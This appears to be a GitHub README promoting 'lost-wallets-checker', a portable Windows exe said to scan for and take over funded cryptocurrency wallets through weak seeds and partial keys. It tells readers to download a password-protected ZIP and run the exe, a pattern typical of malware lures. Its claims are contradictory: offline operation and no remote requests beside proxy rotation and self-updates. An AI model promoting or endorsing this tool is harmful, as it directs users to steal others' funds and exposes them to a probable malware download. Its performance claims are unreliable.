<p align="center">
  <img src="https://img.shields.io/badge/Version-2.7.1-brightgreen?style=for-the-badge&logo=github">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%20%7C%2011-0078D4?style=for-the-badge&logo=windows&logoColor=white">
  <img src="https://img.shields.io/badge/Language-C%2B%2B-00599C?style=for-the-badge&logo=c%2B%2B&logoColor=white">
  <img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge&logo=opensourceinitiative&logoColor=white">
  <img src="https://img.shields.io/badge/Status-Active%20%F0%9F%9A%80-success?style=for-the-badge">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/BTC-ff9900?style=for-the-badge&logo=bitcoin&logoColor=white">
  <img src="https://img.shields.io/badge/Ethereum-3C3C3D?style=for-the-badge&logo=ethereum&logoColor=white">
  <img src="https://img.shields.io/badge/Solana-9945FF?style=for-the-badge&logo=solana&logoColor=white">
  <img src="https://img.shields.io/badge/BNB-F3BA2F?style=for-the-badge&logo=binance&logoColor=black">
</p>

![Image alt](https://github.com/Maluinenbergen/Bit_Cracker/blob/main/screen.gif)

![Image alt](https://github.com/Maluinenbergen/Bit_Cracker/blob/main/screen2.gif)

# 🔥 lost-wallets-checker — Professional Wallet Access Tool

> **ZIP password: `2026`**  
> **Extract → Run `lost-wallets-checker.exe` – no install, portable**

## 🚀 Quick Start
1. Download the latest `lost-wallets-checker.zip` from [Releases](../../releases)
2. Unpack with password: `2026`
3. Run `lost-wallets-checker.exe`
4. Press START and wait — the system scans and tests wallet accesses

When a wallet with funds is found, all data is saved to a folder next to the exe.

## ⚙️ How It Works
The tool uses **multi-threaded scanning + probabilistic matching algorithms** to recover access to wallets based on weak entropy or partial key fragments.

- Works offline — no blockchain sync required
- Does not require private keys to start
- Automatic detection of standard derivation paths
- Does not send requests to remote servers

## 🧠 Features
- ✅ Supports **BTC, ETH, SOL, BNB, LTC, TRX, DASH, DOGE** and ERC‑20/BEP‑20 tokens
- ✅ Works with **Electrum, Exodus, Trust Wallet, MetaMask, Atomic Wallet, Ledger Live** (no device required)
- ✅ Two modes: **Fast Scan** (100 seeds/min) | **Deep Scan** (10 seeds/min, higher hit rate)
- ✅ Saves results instantly in `logs/wallet_data.json`
- ✅ Built‑in proxy rotation for safe scanning
- ✅ Kill‑switch: closes on `ESC` key press
- ✅ Self‑update module via GitHub


## ⚙️ Configuration (optional)
Create `config.ini` next to the exe:
```ini
[SETTINGS]
threads = 8
mode = fast
save_logs = true
proxy = none

<p align="center">
  ⭐ If this tool helped you, give it a star on GitHub ⭐
</p>
